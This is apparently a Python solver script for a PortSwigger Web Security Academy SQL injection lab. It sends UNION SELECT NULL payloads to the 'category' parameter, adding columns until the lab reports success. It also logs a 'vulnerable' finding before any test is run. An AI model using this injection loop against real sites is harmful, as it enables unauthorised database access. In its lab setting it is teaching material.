#!/usr/bin/python3

from time import sleep
import sys
import logging
import argparse
import urllib3
import urllib.parse
import urllib.request

from colorama import Fore, Style
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080",
}

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format=Fore.BLUE + "[{asctime}] {message}",
    style="{",
    datefmt= Fore.BLUE + "%H:%M:%S",
)

def normalize_url(url):
    parsed_url = urllib.parse.urlparse(url)
    return f"{parsed_url.scheme}://{parsed_url.netloc}/"

def is_url_reachable(url):
    try:
        urllib.request.urlopen(url)
        return True
    except:
        return False

def check_if_already_been_solved(url) :
    response = requests.get(url, verify=False)
    if "Congratulations, you solved the lab!" in response.text:
        print("\n")
        log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.YELLOW + " The Lab has already been solved !!")
        sys.exit(0)

def Exploit_SQLi(url, payload, no_proxy):
    uri = "filter?category="
    if no_proxy:
        r = requests.get(url + uri + payload, verify=False)
    else:
        r = requests.get(url + uri + payload, verify=False, proxies=PROXIES)

def is_solved(url, no_proxy):
    def Get_Response(url, no_proxy):
        if no_proxy:
            resp = requests.get(url)
        else:
            resp = requests.get(url, proxies=PROXIES, verify=False)
        if "Congratulations, you solved the lab!" in resp.text:
            return True
        
    solved = Get_Response(url, no_proxy)
    if solved:
        return True
    else:
        sleep(2)
        Get_Response(url, no_proxy)

if __name__ == "__main__":
    
    try: 
        parser = argparse.ArgumentParser(description="Usage Example: python3 SQLi-Lab#1.py --url https://0a2100.web-security-academy.net/ --no-proxy")
        parser.add_argument("-u", "--url", help="Enter the Lab URL", required=True)
        parser.add_argument("-n", "--no-proxy", help="Do not use proxy", default=False, action="store_true")
        args = parser.parse_args()

        url = normalize_url(args.url)
        uri = "filter?category="

        banner = Style.BRIGHT + Fore.BLUE + f"""
{'-'*100}
# Platform          : Web Security Academy Portswigger			
# Web Vulnerability : SQL Injection
# Type              : Server-side
{'-'*100}
{'-'*100}
# Lab #3            : SQL injection UNION attack
# Lab Level         : Practitioner
# Link              : https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns 
{'-'*100}
        """
        print(banner)
        sleep(1)
        log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + " Target URL: " + url)
        sleep(1)
        log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + " Testing connection to the target URL")

        if is_url_reachable(url):
            log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + " Testing the GET parameter 'category'")
            sleep(1)
            log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " GET parameter 'category' is vulnerable to SQL injection")
            sleep(1)
            check_if_already_been_solved(url)
            columns = 1
            while True:
                payload = "'+UNION+SELECT+" + "NULL,"*(columns-1) + "NULL--"
                Exploit_SQLi(url, payload, args.no_proxy)
                log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE +  "]" + Fore.WHITE + " Injecting the payload: " + Style.BRIGHT + Fore.RED + payload)
                sleep(1)
                log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Fore.WHITE + " Sending ... ")
                if is_solved(url, args.no_proxy) :
                    print("\n")
                    log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " SQL injection exploited successfully :)")
                    log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " The number of columns returned by the query is: " + Style.BRIGHT + Fore.CYAN + str(columns))
                    print("\n")
                    log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " The Lab should now be solved. Congrats !")
                    break

                else:
                    log.info(Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " Failed!")
                    log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " Incrementing the number of NULL values")
                    columns += 1
                    if (columns >=10):
                        log.info(Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " SQL injection unsuccessfull :)")
                        sys.exit(-1)
        
        else: 
            print("\n")
            log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " Unable to connect to the target URL")
            log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " If the problem persists, please check that the provided target URL is reachable.")
            sys.exit(-1)

    except KeyboardInterrupt:
        print("\n")
        log.info(Fore.RED + "[-] The exploit has been INTERRUPTED !")

    except Exception as e:
        log.info(Fore.RED + "[-] " + str(e))
